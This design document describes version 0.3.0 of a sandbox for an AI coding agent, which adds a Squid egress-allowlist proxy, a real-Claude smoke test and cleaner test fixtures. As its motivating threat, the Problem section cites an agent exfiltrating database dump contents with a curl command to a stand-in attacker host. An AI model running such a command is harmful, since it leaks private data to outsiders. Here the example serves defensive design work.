# claude-code-sandbox v0.3.0 — Design

**Status:** Approved
**Date:** 2026-05-23
**Owner:** Huijo Kim
**Predecessor:** v0.2.0 (`bb8d145`)

## Problem

v0.2.0 closed the on-image-layer dump exfiltration path and tightened the operator UX, but the agent's network position is still "open internet egress through a default bridge network." Today the only enforced isolation is the db service's `internal: true` network and the deletion of `~/.docker` plugin reachability — the agent itself can reach any FQDN that resolves. Marketing the project as a "sandbox" with this gap is not defensible: an agent that hallucinates a `curl https://attacker.example/$DUMP_CONTENT` is currently unblocked.

Plus two carry-over items that are scoped to a coherent v0.3.0:
- The integration suite still uses the `agent-stub`; the real `claude` binary code path has only been hand-tested.
- The integration `tmp_path` fixtures share a single root that mixes the fixture repo, the tiny dump, and the patched images tree.

## Goals

1. **Enforce egress allowlisting** at the agent container's network boundary. The agent reaches `api.anthropic.com` and a small set of package/git registries through a proxy; everything else is dropped at L7. The agent's underlying bridge network is `internal: true` so there's no path around the proxy.
2. **Add a real-Claude opt-in smoke test** that exercises the actual `claude` binary against a tiny repo + dump + harmless goal, gated by an `ANTHROPIC_API_KEY` env check.
3. **Decouple integration test fixtures** into named subdirs of `tmp_path` for cleaner failure attribution.

## Non-goals

- Network policy at the L3/L4 level (iptables sidecars, custom CNI). HTTP-aware allowlisting at L7 via a forward proxy is the right unit of enforcement for this use case — domains are how operators reason about what the agent should reach.
- Per-domain rate limiting / Squid's full feature set. We use Squid as a minimal allowlist.
- A configuration UI for the allowlist. The default list is baked in; the CLI exposes `--extra-egress-allowlist host.example` for one-off additions.
- CI infrastructure. The smoke test is manual-trigger; bringing it into CI is a v0.4.0 concern.

## Architectural changes

### 1. Egress proxy service

The sandbox compose project gains a third service: `proxy`. Each session runs a Squid instance with an allowlist baked into a session-scoped config file.

```
sandbox compose project

  ┌────────────────────┐
  │ agent              │ ──► proxy:3128 ──► public internet (allowlisted FQDNs only)
  │  (no direct egress)│
  └─────────┬──────────┘
            │ db_net (internal)
  ┌─────────┴──────────┐
  │ db                 │  (unchanged — still internal-only)
  └────────────────────┘
```

Concrete changes:

- New service in `compose.yml.j2`:
  ```yaml
  proxy:
    image: ubuntu/squid:latest
    networks: [agent_net, proxy_egress_net]
    volumes:                                  # NO host bind-mounts — file copied in by CLI
      - proxy_config:/etc/squid/conf.d:ro     # actually a named volume populated by an init container, see below
    healthcheck:
      test: ["CMD-SHELL", "squidclient -h 127.0.0.1 cache_object://localhost/info | grep -q 'Squid Object Cache' || exit 1"]
      interval: 5s
      timeout: 3s
      retries: 30
  ```

- Networks restructure:
  ```yaml
  networks:
    agent_net:
      driver: bridge
      internal: true                          # CHANGED — agent has NO direct egress anymore
    proxy_egress_net:
      driver: bridge                          # unchanged bridge — public internet
    db_net:
      driver: bridge
      internal: true                          # unchanged
  ```

- The `agent` service env gains:
  ```yaml
  HTTPS_PROXY: http://proxy:3128
  HTTP_PROXY: http://proxy:3128
  NO_PROXY: db,localhost,127.0.0.1
  ```

- The `agent` service is on `agent_net` and `db_net` only — NOT on `proxy_egress_net`. The proxy is on both `agent_net` (agent talks to it on TCP/3128) and `proxy_egress_net` (proxy reaches the internet).

The allowlist is rendered into `squid.conf` at session-start by the CLI, copied into the proxy container with `docker cp` immediately after `compose up` (mirroring the dump-import pattern), then Squid is reconfigured.

**Wait — `docker cp` into Squid requires Squid to reload its config.** Two options:
- (a) Bake the config into a per-session image (returns to the build-layer pattern we just escaped).
- (b) Use Squid's `-z` initialization and start it with a path that the CLI writes via `docker cp` BEFORE Squid's main process starts. This requires an entrypoint shim that waits for the config file to appear.

Option (b) chosen. We use a custom `images/proxy/` directory with:
- `Dockerfile` — `FROM ubuntu/squid:latest`, copies a small entrypoint that waits for `/etc/squid/conf.d/allowlist.conf` to be readable, then `exec`s the upstream entrypoint.
- `entrypoint.sh` — `until [ -s /etc/squid/conf.d/allowlist.conf ]; do sleep 0.5; done; exec /sbin/entrypoint.sh "$@"` (path TBD per upstream image).

Then the CLI:
1. `compose up` (proxy starts but blocks in entrypoint waiting for config).
2. Render `squid.conf` from a template into `sdir/proxy/allowlist.conf`.
3. `docker cp <local>/allowlist.conf <proxy-container>:/etc/squid/conf.d/allowlist.conf`.
4. Squid entrypoint detects the file and `exec`s the real Squid.
5. Then the existing `wait_for_db_ready` + dump import flow runs in parallel/after.

Sequencing: agent's existing wait-for-`/input/repo.bundle` already gates real work; we copy inputs to agent AFTER both the dump is restored AND the proxy is up.

### 2. Allowlist default

Baked default groups, selectable by flag:

| Group | FQDNs |
|-------|-------|
| `anthropic` | `api.anthropic.com`, `console.anthropic.com` |
| `github` | `github.com`, `*.github.com`, `*.githubusercontent.com`, `api.github.com` |
| `python` | `pypi.org`, `files.pythonhosted.org`, `pythonhosted.org` |
| `node` | `registry.npmjs.org`, `*.npmjs.org` |
| `default` | union of `anthropic`, `github`, `python`, `node` |

`sandbox start ... --egress-allowlist default` (default if flag omitted) gets the union. `--egress-allowlist anthropic,github` gets a subset. `--extra-egress-allowlist data.example.com,assets.example.com` appends one-off domains.

### 3. Real-Claude smoke test

A new `tests/smoke/test_real_claude.py` marked `@pytest.mark.smoke`. Opt in via `pytest --run-smoke`. Test:
- Checks `ANTHROPIC_API_KEY` (or `~/.claude/.credentials.json`) is available; skip with a clear message if not.
- Starts a sandbox session against a single-file fixture repo with goal `"add a single-line print('hello from sandbox') to x.py and commit"`.
- Polls for completion (max 5 min — real Claude is slower than the stub).
- `finish`es; asserts the patch contains `hello from sandbox` and that the commit count on the agent branch is `>= 2`.

We add a `pytest_addoption("--run-smoke")` to the integration conftest, mirroring `--run-integration`.

### 4. Fixture decoupling

`tests/integration/conftest.py` is changed so each fixture writes to its own named subdir of `tmp_path` (e.g., `tmp_path / "fixture_repo"`, `tmp_path / "dump"`, `tmp_path / "images"`). No behavior change; cleaner attribution if anything goes wrong.

## Data flow updates

`sandbox start` after v0.3.0:

1. Credentials check.
2. `session.new_session`.
3. `dump.fetch`.
4. Assemble agent build context (unchanged).
5. Resolve effective allowlist from `--egress-allowlist` + `--extra-egress-allowlist`.
6. Render `squid.conf` into `sdir/proxy/allowlist.conf`.
7. Bare repo init.
8. Render compose.yml (now includes `proxy` + restructured networks).
9. `compose up -d --build`.
10. NEW: `docker cp sdir/proxy/allowlist.conf <proxy-container>:/etc/squid/conf.d/allowlist.conf`.
11. NEW: wait for proxy to become healthy (Squid healthcheck reports healthy).
12. Wait for db ready, import dump (unchanged from v0.2).
13. `docker cp` agent inputs (unchanged from v0.2).
14. Start log follower.

The agent's existing `/input/repo.bundle` wait remains the gate that prevents the agent from running before both proxy and db are ready.

## Error handling

| Failure | Behavior |
|---------|----------|
| Allowlist render fails (empty after dedup) | `cmd_start` aborts before `compose up`; session marked failed; clear error. |
| `docker cp` of squid.conf fails | Same as agent-input cp failure: marks session failed, runs the established cleanup. |
| Squid healthcheck never passes | `cmd_start` times out (60s) and marks session failed. |
| Agent tries a non-allowlisted host | Squid returns HTTP 403; the agent (or whatever process) sees that as a real error and either retries or reports it. We don't try to be helpful here — opacity is the point of the boundary. |

## Open implementation details

- Upstream `ubuntu/squid:latest` may name its config dir differently; the entrypoint path needs verification when the task lands. Fallback: build a tiny image from `debian:bookworm-slim` + `apt install squid` if the official image's entrypoint is awkward.
- HTTPS through Squid via `CONNECT` requires no MITM (no cert injection) — we are explicitly NOT inspecting payloads, just allowlisting the FQDN at TLS handshake time via SNI. This is what `http_access` + `acl … ssl::server_name` enables.
- DNS: Squid does the lookups for the allowlisted domains; the agent's `/etc/resolv.conf` is the container default and shouldn't need overriding because the agent doesn't make DNS queries itself (HTTPS_PROXY ships the URL to Squid). Verify this in the isolation test.
